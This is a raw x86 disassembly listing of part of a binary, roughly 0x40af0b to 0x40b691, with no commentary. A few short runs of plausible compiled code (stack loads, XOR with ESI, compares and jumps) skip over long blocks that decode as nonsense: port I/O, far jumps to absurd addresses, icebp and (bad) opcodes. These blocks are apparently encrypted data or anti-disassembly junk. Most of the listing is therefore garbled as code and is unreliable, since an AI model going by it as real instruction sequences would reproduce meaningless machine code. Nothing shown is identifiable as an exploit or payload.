  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	adc    dh,BYTE PTR [esi]
  40af6b:	adc    ebx,DWORD PTR [esi+0x46]
  40af6e:	jmp    0x7070:0x7f957070
  40af75:	into   
  40af76:	sub    eax,0x20cec0c5
  40af7b:	addr16 addr16 and esp,esi
  40af7f:	fsubr  st,st(0)
  40af81:	aaa    
  40af82:	pop    es
  40af83:	or     BYTE PTR ss:[edi-0x1c90ce9b],dh
  40af8a:	in     eax,dx
  40af8b:	pop    eax
  40af8c:	dec    DWORD PTR [ebp-0x7c23dffe]
  40af92:	sub    BYTE PTR [edx+0x74],dh
  40af95:	shl    DWORD PTR [ebx+0x5a22d8e7],0xb9
  40af9c:	mov    ch,0x7d
  40af9e:	out    dx,eax
  40af9f:	in     al,dx
  40afa0:	jo     0x40af48
  40afa2:	pop    ds
  40afa3:	mov    al,0x29
  40afa5:	cli    
  40afa6:	sbb    al,0x72
  40afa8:	sub    edi,DWORD PTR [eax]
  40afaa:	xchg   esi,eax
  40afab:	pusha  
  40afac:	pop    ss
  40afad:	sub    edx,esp
  40afaf:	loopne 0x40af4c
  40afb1:	test   DWORD PTR [esi+edx*4],esi
  40afb4:	iret   
  40afb5:	or     ch,cl
  40afb7:	into   
  40afb8:	jl     0x40aff5
  40afba:	ss pop es
  40afbc:	aas    
  40afbd:	mov    eax,0x24d5ad31
  40afc2:	mov    BYTE PTR [ebx+0xcf1ed15],ch
  40afc8:	retf   0x405a
  40afcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afcc:	test   BYTE PTR [ecx-0x385e10a6],ah
  40afd2:	cmp    dh,bh
  40afd4:	push   ds
  40afd5:	rcl    DWORD PTR fs:[esi+eax*8],1
  40afd9:	dec    esp
  40afda:	retf   
  40afdb:	ret    
  40afdc:	dec    edi
  40afdd:	outs   dx,BYTE PTR ds:[esi]
  40afde:	bound  eax,QWORD PTR [ebx]
  40afe0:	loope  0x40afbc
  40afe2:	mov    esi,0xa98eb266
  40afe7:	out    dx,al
  40afe8:	mov    dh,0xf8
  40afea:	or     eax,0xff62ff1a
  40afef:	aaa    
  40aff0:	inc    eax
  40aff1:	ret    0x93e4
  40aff4:	or     edx,DWORD PTR [edx-0x73a52a4b]
  40affa:	std    
  40affb:	rcl    BYTE PTR [esi],1
  40affd:	popa   
  40affe:	int3   
  40afff:	retf   
  40b000:	ret    0x391e
  40b003:	add    al,0xa9
  40b005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b006:	add    eax,0x441b90fd
  40b00b:	in     eax,0xf2
  40b00d:	sub    DWORD PTR [ebp+0xf],eax
  40b010:	shl    BYTE PTR [esi],cl
  40b012:	xchg   DWORD PTR [ebx],edi
  40b014:	sub    BYTE PTR [edi+ebp*1+0x529a8bf0],al
  40b01b:	xor    ch,ah
  40b01d:	mov    dl,BYTE PTR [ecx-0x464465eb]
  40b023:	jp     0x40aff7
  40b025:	mov    bl,0x80
  40b027:	or     BYTE PTR [ecx],al
  40b029:	rol    DWORD PTR [ebx],0xcd
  40b02c:	fwait
  40b02d:	mov    fs,WORD PTR [esi+0x5ea8b3f5]
  40b033:	inc    esp
  40b034:	xor    al,0xe3
  40b036:	mov    bh,0xcf
  40b038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b039:	xchg   esp,eax
  40b03a:	ret    0x39ca
  40b03d:	sub    dl,BYTE PTR [edi]
  40b03f:	retf   0x4289
  40b042:	sar    BYTE PTR [edx+0x74],0x2
  40b046:	cmp    edx,edx
  40b048:	icebp  
  40b049:	dec    esp
  40b04a:	sbb    eax,0x3e41128d
  40b04f:	jbe    0x40b052
  40b051:	aad    0x41
  40b053:	xchg   esi,eax
  40b054:	ret    0x3b77
  40b057:	add    BYTE PTR [edi],cl
  40b059:	or     DWORD PTR [edx],ecx
  40b05b:	retf   
  40b05c:	and    dl,BYTE PTR [esi]
  40b05e:	pop    esi
  40b05f:	and    ah,BYTE PTR [esi]
  40b061:	push   edx
  40b062:	inc    esp
  40b063:	pop    eax
  40b064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b065:	jecxz  0x40b0d9
  40b067:	fist   WORD PTR [esi+0x4c4b2fc]
  40b06d:	xchg   edx,eax
  40b06e:	jbe    0x40aff6
  40b070:	ds iret 
  40b072:	mov    ebp,0x43ac06c1
  40b077:	je     0x40b0e5
  40b079:	jnp    0x40b02b
  40b07b:	sti    
  40b07c:	iret   
  40b07d:	mov    ebx,0x8facdd77
  40b082:	mov    ds:0x518b5f61,al
  40b087:	data16 jl 0x40b08a
  40b08a:	repz icebp 
  40b08c:	inc    edi
  40b08d:	mov    ds:0xb296eef0,al
  40b092:	fidivr WORD PTR [eax-0x55d6bc42]
  40b098:	cdq    
  40b099:	or     edi,DWORD PTR [esi]
  40b09b:	mov    ebx,edi
  40b09d:	lock sar BYTE PTR [ecx-0x29],cl
  40b0a1:	adc    DWORD PTR [eax-0x2b558434],ecx
  40b0a7:	mov    cl,0x18
  40b0a9:	in     al,0xab
  40b0ab:	cmp    al,0x6b
  40b0ad:	cmp    eax,0xe68ddfe
  40b0b2:	dec    ebx
  40b0b3:	and    ecx,edx
  40b0b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0b6:	scas   al,BYTE PTR es:[edi]
  40b0b7:	pushf  
  40b0b8:	sahf   
  40b0b9:	in     al,dx
  40b0ba:	jmp    FWORD PTR ds:0x8ae08937
  40b0c0:	or     al,0xb0
  40b0c2:	into   
  40b0c3:	pop    eax
  40b0c4:	add    ebx,esi
  40b0c6:	pop    ecx
  40b0c7:	cmp    bl,dh
  40b0c9:	imul   esi,DWORD PTR [ecx+0x5c0a02dc],0xffffff98
  40b0d0:	in     eax,dx
  40b0d1:	mov    ecx,0x2e903da0
  40b0d6:	or     ebx,0xffffffc7
  40b0d9:	jo     0x40b083
  40b0db:	cmp    BYTE PTR [edi+0x4b],ch
  40b0de:	call   0x303cb4b0
  40b0e3:	mov    al,ds:0xc7a80538
  40b0e8:	out    0x49,al
  40b0ea:	test   DWORD PTR [eax-0x32],edx
  40b0ed:	jnp    0x40b11d
  40b0ef:	ret    
  40b0f0:	cli    
  40b0f1:	shl    BYTE PTR [edi+ebp*8-0x7b],0x97
  40b0f6:	push   ebx
  40b0f7:	in     al,dx
  40b0f8:	imul   edx,DWORD PTR [esi],0xffffff8d
  40b0fb:	cmc    
  40b0fc:	loope  0x40b085
  40b0fe:	jo     0x40b089
  40b100:	out    dx,al
  40b101:	mov    al,0xa1
  40b103:	mov    edx,fs
  40b105:	pop    es
  40b106:	ret    0x7701
  40b109:	adc    BYTE PTR [ecx+0x1],bh
  40b10c:	sub    eax,0x8b29b48b
  40b111:	dec    ebp
  40b112:	call   0x8c38f6a2
  40b117:	add    BYTE PTR [ebx+0xc8d3c40],cl
  40b11d:	int    0x78
  40b11f:	add    BYTE PTR [eax],al
  40b121:	add    BYTE PTR [ebx],al
  40b123:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40b12a:	add    al,0x8
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	xchg   ebp,eax
  40b148:	stos   DWORD PTR es:[edi],eax
  40b149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b14a:	adc    eax,0x7070e8db
  40b14f:	xchg   ebp,eax
  40b150:	jg     0x40b1c2
  40b152:	jo     0x40b110
  40b154:	sbb    BYTE PTR [edx],dl
  40b156:	inc    ebx
  40b157:	jl     0x40b1bd
  40b159:	xchg   edx,eax
  40b15a:	sub    ebx,edx
  40b15c:	test   eax,0x5cfdb343
  40b161:	or     eax,0x5bd547b1
  40b166:	leave  
  40b167:	adc    BYTE PTR [edx-0x1a171599],al
  40b16d:	loop   0x40b12f
  40b16f:	pop    DWORD PTR [ebp-0x76d67d66]
  40b175:	in     eax,0x58
  40b177:	pop    esi
  40b178:	dec    esi
  40b179:	stos   DWORD PTR es:[edi],eax
  40b17a:	mov    bh,0xe8
  40b17c:	sbb    eax,0xf586d00b
  40b181:	and    al,0x9c
  40b183:	aam    0x61
  40b185:	call   FWORD PTR [edi-0x62131b3e]
  40b18b:	fcomp  DWORD PTR ds:0x139f9014
  40b191:	stc    
  40b192:	mov    edi,0x5ae40402
  40b197:	ror    BYTE PTR fs:[edx-0x1efd4b2],1
  40b19e:	in     eax,dx
  40b19f:	mov    BYTE PTR ds:0x6115361e,dh
  40b1a5:	dec    edx
  40b1a6:	and    BYTE PTR [ebp+0x3b12fc91],ah
  40b1ac:	or     al,0xd7
  40b1ae:	fwait
  40b1af:	(bad)  
  40b1b0:	in     eax,dx
  40b1b1:	inc    esi
  40b1b2:	popfw  
  40b1b4:	sbb    esp,eax
  40b1b6:	stc    
  40b1b7:	dec    ebp
  40b1b8:	mov    bh,0xea
  40b1ba:	jg     0x40b156
  40b1bc:	mov    edx,0x2ba6cd54
  40b1c1:	test   BYTE PTR [esi-0x30],cl
  40b1c4:	or     DWORD PTR [edi],edi
  40b1c6:	add    eax,0x6e812cf2
  40b1cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1cc:	clc    
  40b1cd:	push   ebx
  40b1ce:	mov    al,0xf8
  40b1d0:	je     0x40b166
  40b1d2:	loopne 0x40b21b
  40b1d4:	mov    dl,0x93
  40b1d6:	dec    ebx
  40b1d7:	dec    edx
  40b1d8:	adc    dh,ch
  40b1da:	add    BYTE PTR [ecx+0x6],0xe2
  40b1de:	popa   
  40b1df:	popf   
  40b1e0:	xchg   edx,eax
  40b1e1:	fld    QWORD PTR [edx-0x408c3ed1]
  40b1e7:	push   edx
  40b1e8:	test   DWORD PTR [edi-0x6ec46c4d],ebp
  40b1ee:	ds je  0x40b22d
  40b1f1:	sti    
  40b1f2:	mov    esp,0x677a2061
  40b1f7:	push   cs
  40b1f8:	and    esp,ebp
  40b1fa:	adc    DWORD PTR [ecx+0x5cbcd2d3],0x56
  40b201:	aad    0x48
  40b203:	cmp    bh,BYTE PTR [ebp+ebp*2+0x52]
  40b207:	pop    ebp
  40b208:	(bad)  
  40b209:	and    edx,DWORD PTR [esi+edi*8]
  40b20c:	pop    DWORD PTR [edi-0x23e81b21]
  40b212:	pop    esp
  40b213:	mov    edx,0x44fb1076
  40b218:	in     eax,dx
  40b219:	call   0xdb23:0x9a24c629
  40b220:	jns    0x40b29e
  40b222:	adc    dl,BYTE PTR [edx+0x70]
  40b225:	and    DWORD PTR [ecx],edi
  40b227:	jo     0x40b29c
  40b229:	pop    esi
  40b22a:	mov    dl,0x50
  40b22d:	xchg   DWORD PTR [ecx+0x39],ebx
  40b230:	or     eax,0xd3787c51
  40b235:	pop    ecx
  40b236:	popa   
  40b237:	dec    ebp
  40b238:	data16 or al,0xb
  40b23b:	idiv   DWORD PTR [edi+0x73edc4b]
  40b241:	jmp    0x40b296
  40b243:	lods   al,BYTE PTR ds:[esi]
  40b244:	sahf   
  40b245:	adc    edx,esp
  40b247:	addr16 aas 
  40b249:	mov    edi,0xeb8924f7
  40b24e:	xchg   edx,eax
  40b24f:	lds    edi,FWORD PTR [ebp+0x53]
  40b252:	jae    0x40b2c9
  40b254:	cld    
  40b255:	int3   
  40b256:	inc    edi
  40b257:	ss and eax,0x47e528c3
  40b25d:	jp     0x40b265
  40b25f:	jg     0x40b246
  40b261:	adc    eax,0x9ce4e63a
  40b266:	adc    ch,bl
  40b268:	or     dl,ah
  40b26a:	sbb    eax,0xed90c465
  40b26f:	mov    bl,0xab
  40b271:	rol    DWORD PTR [edx-0x42760133],1
  40b277:	fidivr DWORD PTR [esi-0x41b51095]
  40b27d:	push   ebx
  40b27e:	sub    DWORD PTR [ecx],ebx
  40b280:	push   es
  40b281:	(bad)  
  40b282:	xchg   ebp,eax
  40b283:	push   0x8f25b55a
  40b288:	rol    esp,cl
  40b28a:	in     eax,dx
  40b28b:	mov    fs,WORD PTR [edx+0x76]
  40b28e:	push   ds
  40b28f:	adc    eax,0x6191bd
  40b294:	dec    ecx
  40b295:	adc    BYTE PTR [ebx],ch
  40b297:	cmp    BYTE PTR [eax+ebx*8-0x35f98ddf],bh
  40b29e:	ror    BYTE PTR [esi-0x66],cl
  40b2a1:	dec    esi
  40b2a2:	ja     0x40b302
  40b2a4:	mov    dl,0xd3
  40b2a6:	or     eax,0x7b8c5b17
  40b2ab:	push   ss
  40b2ac:	xchg   DWORD PTR ds:0xe32a1ed5,edx
  40b2b2:	scas   eax,DWORD PTR es:[edi]
  40b2b3:	sbb    ecx,DWORD PTR [edx-0x34]
  40b2b6:	and    al,0x7c
  40b2b8:	mov    dh,0x85
  40b2ba:	bound  esi,QWORD PTR [edx+edi*8+0x58c37bfe]
  40b2c1:	mov    ebx,0xb85677e8
  40b2c6:	mov    esp,0x33330567
  40b2cb:	sbb    dl,ah
  40b2cd:	lds    eax,FWORD PTR [edx]
  40b2cf:	inc    esp
  40b2d0:	or     al,dl
  40b2d2:	retf   0xc01e
  40b2d5:	push   ss
  40b2d6:	sbb    ebp,esp
  40b2d8:	adc    ebx,DWORD PTR [ebx]
  40b2da:	aad    0x6
  40b2dc:	mov    al,0x93
  40b2de:	mov    ebx,0x89ca87c6
  40b2e3:	push   cs
  40b2e4:	aaa    
  40b2e5:	xchg   esp,eax
  40b2e6:	imul   esi,DWORD PTR [ebx-0x77],0x6f
  40b2ea:	imul   esp,DWORD PTR [eax-0x64],0xdc4589f3
  40b2f1:	jmp    0x40b4a9
  40b2f6:	mov    cl,0x4
  40b2f8:	icebp  
  40b2f9:	in     al,0x71
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0x53dbadc9
  40b303:	push   cs
  40b304:	or     al,0x8f
  40b306:	jo     0x40b2fe
  40b308:	jo     0x40b37a
  40b30a:	xchg   ebp,eax
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b339
  40b30f:	mov    al,ds:0xfb6edc41
  40b314:	(bad)  
  40b315:	pop    eax
  40b316:	popa   
  40b317:	xlat   BYTE PTR ds:[ebx]
  40b318:	adc    ax,0xb9b6
  40b31c:	repnz inc esp
  40b31e:	and    dh,bh
  40b320:	dec    esi
  40b321:	jae    0x40b2c0
  40b323:	stos   BYTE PTR es:[edi],al
  40b324:	div    DWORD PTR [eax+0x5f9c9bdc]
  40b32a:	inc    eax
  40b32b:	sub    edi,DWORD PTR [ebx+0x13]
  40b32e:	mov    al,0x30
  40b330:	or     BYTE PTR [eax],0x12
  40b333:	cmp    eax,0x38f1598f
  40b338:	test   edi,0x81ac8494
  40b33e:	jmp    FWORD PTR [edx+0x3e284659]
  40b344:	stos   DWORD PTR es:[edi],eax
  40b345:	mov    al,ds:0x35fa257a
  40b34a:	std    
  40b34b:	push   0xfe70f3c5
  40b350:	jmp    0x40b31c
  40b352:	test   DWORD PTR [ecx+0x56535726],ebp
  40b358:	mov    fs,ecx
  40b35a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b35b:	pusha  
  40b35c:	jne    0x40b3c2
  40b35e:	push   ss
  40b35f:	sub    DWORD PTR [eax],esi
  40b361:	in     al,dx
  40b362:	sub    edi,DWORD PTR [esi]
  40b364:	imul   edi,DWORD PTR [ecx-0x554c4a23],0x7e8a12e0
  40b36e:	test   eax,0xb1774744
  40b373:	test   al,0xcc
  40b375:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b377:	ss icebp 
  40b379:	xchg   edx,eax
  40b37a:	dec    ebp
  40b37b:	xlat   BYTE PTR ds:[ebx]
  40b37c:	mov    esi,0x3c921ac2
  40b381:	inc    eax
  40b382:	ss je  0x40b305
  40b385:	sti    
  40b386:	das    
  40b387:	push   ds
  40b388:	mov    DWORD PTR [edi+0x3d07b6cf],ecx
  40b38e:	fadd   QWORD PTR [edx+0x6146234f]
  40b394:	in     eax,0xe0
  40b396:	push   ss
  40b397:	xchg   esp,eax
  40b398:	inc    ecx
  40b399:	into   
  40b39a:	pop    ds
  40b39b:	sahf   
  40b39c:	sbb    esp,ebp
  40b39e:	sti    
  40b39f:	std    
  40b3a0:	dec    ebx
  40b3a1:	mov    eax,0xe2c99d6a
  40b3a6:	mov    al,ds:0x210c5d98
  40b3ab:	fdivr  DWORD PTR [ecx+ebp*4-0x6b]
  40b3af:	lahf   
  40b3b0:	adc    dh,BYTE PTR [esi-0x625ec2a2]
  40b3b6:	and    ah,BYTE PTR [edx]
  40b3b8:	xchg   edi,eax
  40b3b9:	adc    ebp,DWORD PTR [ebx+0x6e]
  40b3bc:	rcr    BYTE PTR [esi],1
  40b3be:	popf   
  40b3bf:	repnz push ecx
  40b3c1:	ficom  WORD PTR [edi-0x1d]
  40b3c4:	jno    0x40b379
  40b3c6:	pop    esi
  40b3c7:	xor    al,0x53
  40b3c9:	imul   ebp,esi,0xffffffb9
  40b3cc:	lahf   
  40b3cd:	add    ebp,eax
  40b3cf:	lods   eax,DWORD PTR ds:[esi]
  40b3d0:	rol    DWORD PTR [ecx],cl
  40b3d2:	dec    ebx
  40b3d3:	push   0x54
  40b3d5:	fwait
  40b3d6:	inc    edi
  40b3d7:	mov    ds:0x223217c,al
  40b3dc:	stc    
  40b3dd:	in     eax,0x29
  40b3df:	jns    0x40b3b5
  40b3e1:	pop    ecx
  40b3e2:	cs add eax,0x28dbbc71
  40b3e8:	and    DWORD PTR [edx-0x47152f69],esi
  40b3ee:	cmc    
  40b3ef:	jae    0x40b387
  40b3f1:	dec    esi
  40b3f2:	inc    esp
  40b3f3:	push   esi
  40b3f4:	and    bl,BYTE PTR [edi-0x52]
  40b3f7:	xor    cl,BYTE PTR [eax+esi*8-0xb]
  40b3fb:	in     eax,dx
  40b3fc:	xchg   esi,eax
  40b3fd:	mov    bl,0x79
  40b3ff:	mov    dl,BYTE PTR [eax-0x7022884d]
  40b405:	add    ebx,DWORD PTR [ebp+0x61]
  40b408:	sbb    dh,BYTE PTR [edi]
  40b40a:	add    DWORD PTR [ecx+eiz*1],ebx
  40b40d:	hlt    
  40b40e:	push   ebp
  40b40f:	arpl   WORD PTR [ebx+0x1b79d59d],dx
  40b415:	ins    BYTE PTR es:[edi],dx
  40b416:	pusha  
  40b417:	loope  0x40b3aa
  40b419:	mov    BYTE PTR [ecx+0x7a6b48b3],bl
  40b41f:	imul   eax,DWORD PTR [esp+edx*1+0x474fdb14],0x19
  40b427:	and    cl,BYTE PTR [eax+0xaeb1291]
  40b42d:	jmp    0x217874b6
  40b432:	jmp    0x90ac52e
  40b437:	jle    0x40b3d7
  40b439:	inc    ecx
  40b43a:	loop   0x40b4b3
  40b43c:	fwait
  40b43d:	loopne 0x40b3d3
  40b43f:	sar    BYTE PTR [eax+0x3061a51],cl
  40b445:	retf   0x4fc5
  40b448:	sub    eax,0x9c8bbe2c
  40b44d:	bound  ebx,QWORD PTR ds:0x2cb2d8b2
  40b453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b454:	imul   edi,DWORD PTR [eax-0x4d],0x8a9ab868
  40b45b:	pop    ebx
  40b45c:	mov    al,ds:0xbfcc16bf
  40b461:	add    al,0xf8
  40b463:	addr16 push edx
  40b465:	nop    DWORD PTR [ebx-0x8e03b3d]
  40b46c:	sub    BYTE PTR [edx+0xe],0x8c
  40b470:	sahf   
  40b471:	xor    eax,0x2b2e2894
  40b477:	push   ecx
  40b478:	or     DWORD PTR [eax+ebp*1-0x24],ecx
  40b47c:	push   cs
  40b47d:	push   0x56
  40b47f:	push   es
  40b480:	mov    ds:0x7aa7839e,al
  40b485:	pop    ebp
  40b486:	ja     0x40b4b6
  40b488:	xchg   ebp,ebp
  40b48a:	adc    eax,DWORD PTR [esi]
  40b48c:	loope  0x40b4b8
  40b48e:	outs   dx,DWORD PTR ds:[esi]
  40b48f:	mov    BYTE PTR [ebx-0x39],ch
  40b492:	jmp    0xf5142a41
  40b497:	mov    esi,0x3f579a92
  40b49c:	adc    BYTE PTR [ebx+0x720fd89c],0xb4
  40b4a3:	in     eax,dx
  40b4a4:	repnz fsub QWORD PTR [edi+0x2]
  40b4a8:	mov    ebp,0x8b08458b
  40b4ad:	dec    ebp
  40b4ae:	loopne 0x40b4e3
  40b4b0:	mov    BYTE PTR [ebx],0xc7
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0x64413075
  40b4de:	ds adc cl,bl
  40b4e1:	xchg   ebp,eax
  40b4e2:	cmc    
  40b4e3:	jo     0x40b555
  40b4e5:	xchg   ebp,eax
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b4a8
  40b4ea:	xor    DWORD PTR [esi+ebx*1-0x1b],esp
  40b4ee:	in     al,dx
  40b4ef:	sbb    al,0xc5
  40b4f1:	popa   
  40b4f2:	fisub  WORD PTR [esi]
  40b4f4:	mov    ss,WORD PTR [esi]
  40b4f6:	repnz push ss
  40b4f8:	arpl   WORD PTR [ebx],si
  40b4fa:	push   ds
  40b4fb:	popa   
  40b4fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4fd:	jl     0x40b481
  40b4ff:	push   ebp
  40b500:	cmp    esp,DWORD PTR [eax+ebp*4-0x5c032f79]
  40b507:	push   esi
  40b508:	fist   DWORD PTR [edi*2-0x3c7fbb82]
  40b50f:	popa   
  40b510:	into   
  40b511:	pop    es
  40b512:	pushf  
  40b513:	cld    
  40b514:	push   ebp
  40b515:	lods   al,BYTE PTR ds:[esi]
  40b516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b517:	sahf   
  40b518:	test   al,0xe3
  40b51a:	nop
  40b51b:	mov    ds:0xa1aedcdf,al
  40b520:	mov    esp,0x1a5a3208
  40b525:	js     0x40b54d
  40b527:	sub    al,0x9a
  40b529:	or     al,0x61
  40b52b:	mov    bl,0x56
  40b52d:	ins    DWORD PTR es:[edi],dx
  40b52e:	or     dh,al
  40b530:	jae    0x40b500
  40b532:	mov    dl,0xff
  40b534:	pop    ss
  40b535:	jl     0x40b5b2
  40b537:	and    al,0xf1
  40b539:	pop    ds
  40b53a:	sub    eax,0x4db0d2e5
  40b53f:	inc    edi
  40b540:	(bad)  
  40b542:	mov    edx,0x478b57d7
  40b547:	mov    al,0x5b
  40b549:	cmp    BYTE PTR [edi-0x1f91397c],bl
  40b54f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b551:	pop    esi
  40b552:	sub    BYTE PTR [ebx],ah
  40b554:	test   esi,ecx
  40b556:	aad    0x1d
  40b558:	call   0x6550:0xe115aec0
  40b55f:	stos   BYTE PTR es:[edi],al
  40b560:	in     al,dx
  40b561:	aaa    
  40b562:	mov    BYTE PTR [ebx-0x71],cl
  40b565:	jo     0x40b5b0
  40b567:	inc    edi
  40b568:	mov    bl,0x35
  40b56a:	aas    
  40b56b:	push   es
  40b56c:	push   ebx
  40b56d:	xchg   DWORD PTR [ebx+0x76f47a],ecx
  40b573:	cwde   
  40b574:	xchg   esi,eax
  40b575:	cmp    edx,ebx
  40b577:	push   esi
  40b578:	jne    0x40b50d
  40b57a:	in     eax,dx
  40b57b:	stos   BYTE PTR es:[edi],al
  40b57c:	fs dec ebx
  40b57e:	xchg   ebx,eax
  40b57f:	ss (bad) 
  40b581:	(bad)  
  40b582:	stos   DWORD PTR es:[edi],eax
  40b583:	adc    DWORD PTR [ecx-0x32497f7],edi
  40b589:	pop    edi
  40b58a:	pop    esi
  40b58b:	jl     0x40b5d8
  40b58d:	xchg   edi,eax
  40b58e:	bound  eax,QWORD PTR [eax]
  40b590:	outs   dx,BYTE PTR ds:[esi]
  40b591:	retf   
  40b592:	shr    DWORD PTR [ebx],0x2d
  40b595:	pop    ss
  40b596:	rol    BYTE PTR [edx-0x20086396],cl
  40b59c:	xlat   BYTE PTR ds:[ebx]
  40b59d:	jns    0x40b530
  40b59f:	loope  0x40b523
  40b5a1:	mov    ss:0xf09acf55,al
  40b5a7:	cmp    BYTE PTR [ebp+0x4d0cde6e],bh
  40b5ad:	jb     0x40b561
  40b5af:	dec    esp
  40b5b0:	jo     0x40b62d
  40b5b2:	add    edi,DWORD PTR [ecx+0x6]
  40b5b5:	push   eax
  40b5b6:	test   DWORD PTR [eax+0x42],ebp
  40b5b9:	xor    cl,BYTE PTR [edx+edi*1]
  40b5bc:	imul   ecx,DWORD PTR [ecx+ebp*8],0xffffffad
  40b5c0:	jbe    0x40b5d2
  40b5c2:	lock hlt 
  40b5c4:	jmp    0x89a72c65
  40b5c9:	inc    eax
  40b5ca:	adc    eax,0x7586f48
  40b5cf:	dec    edi
  40b5d0:	addr16 inc esp
  40b5d2:	pop    ebp
  40b5d3:	mov    BYTE PTR [esi+0x74],bh
  40b5d6:	ror    BYTE PTR [eax-0x21fa3be4],0x30
  40b5dd:	mov    ch,0x7e
  40b5df:	call   0x7a1ce963
  40b5e4:	jo     0x40b5a4
  40b5e6:	lock cwde 
  40b5e8:	ins    BYTE PTR es:[edi],dx
  40b5e9:	fsubr  DWORD PTR [edi-0x5b8c7a8d]
  40b5ef:	inc    ecx
  40b5f0:	xchg   esi,eax
  40b5f1:	add    al,0x42
  40b5f3:	pop    ss
  40b5f4:	into   
  40b5f5:	cmc    
  40b5f6:	aaa    
  40b5f7:	aas    
  40b5f8:	xor    ch,ah
  40b5fa:	retf   
  40b5fb:	push   edi
  40b5fc:	aas    
  40b5fd:	mov    esp,0xb4096ad7
  40b602:	jmp    0xeda8b352
  40b607:	leave  
  40b608:	cmc    
  40b609:	lods   al,BYTE PTR ds:[esi]
  40b60a:	inc    esp
  40b60b:	and    al,0xca
  40b60d:	and    eax,0xff32726a
  40b612:	jl     0x40b605
  40b614:	xchg   BYTE PTR [eax],al
  40b616:	sub    esp,0x72d152f8
  40b61c:	dec    ecx
  40b61d:	pop    ebp
  40b61e:	add    al,0x24
  40b620:	enter  0x7075,0xfd
  40b624:	adc    BYTE PTR [ecx-0x26],ch
  40b627:	jg     0x40b61b
  40b629:	mov    dl,BYTE PTR [ecx+ecx*8+0x78]
  40b62d:	(bad)  
  40b62e:	jp     0x40b64b
  40b630:	jae    0x40b5c5
  40b632:	sub    eax,0x4b08ca25
  40b637:	gs mov esi,0x99d12033
  40b63d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b63e:	cld    
  40b63f:	fidiv  WORD PTR [ebp-0x4c]
  40b642:	daa    
  40b643:	int3   
  40b644:	outs   dx,DWORD PTR ds:[esi]
  40b645:	xlat   BYTE PTR ds:[ebx]
  40b646:	inc    edi
  40b647:	imul   ebp,DWORD PTR [ecx*8-0x54bab121],0x60
  40b64f:	pusha  
  40b650:	add    al,0x17
  40b652:	out    0x8c,al
  40b654:	push   ecx
  40b655:	jmp    0x439c:0x4443b1ad
  40b65c:	gs dec eax
  40b65e:	not    BYTE PTR [eax+0x74]
  40b661:	jns    0x40b606
  40b663:	scas   al,BYTE PTR es:[edi]
  40b664:	shr    BYTE PTR [ebx-0x1934aefd],0x19
  40b66b:	lahf   
  40b66c:	test   BYTE PTR [eax-0x30],ch
  40b66f:	test   eax,0x2e013d7e
  40b674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b675:	sbb    eax,0x8ab8a702
  40b67a:	jmp    0x40b5ff
  40b67c:	mov    ch,0xd6
  40b67e:	lods   eax,DWORD PTR gs:[esi]
  40b680:	sub    eax,0x8b96d29c
  40b685:	inc    eax
  40b686:	or     al,0x8b
  40b688:	or     ecx,ebp
  40b68a:	mov    bl,0x1
  40b68c:	add    BYTE PTR [eax],al
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
